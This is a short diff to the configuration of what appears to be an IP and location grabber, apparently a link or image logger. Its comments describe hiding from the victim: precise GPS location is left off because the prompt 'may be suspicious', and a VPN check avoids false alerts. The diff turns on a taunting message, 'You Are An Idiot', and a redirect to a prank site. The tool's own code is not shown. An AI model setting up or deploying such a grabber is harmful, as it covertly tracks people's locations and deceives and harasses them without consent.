@@ -27,9 +27,9 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
 "message": {
-    "doMessage": False,
+    "doMessage": True,
     "richMessage": True,
-    "message": "Your custom message here"
+    "message": "You Are An Idiot"
 },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://youareanidiot.cc" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
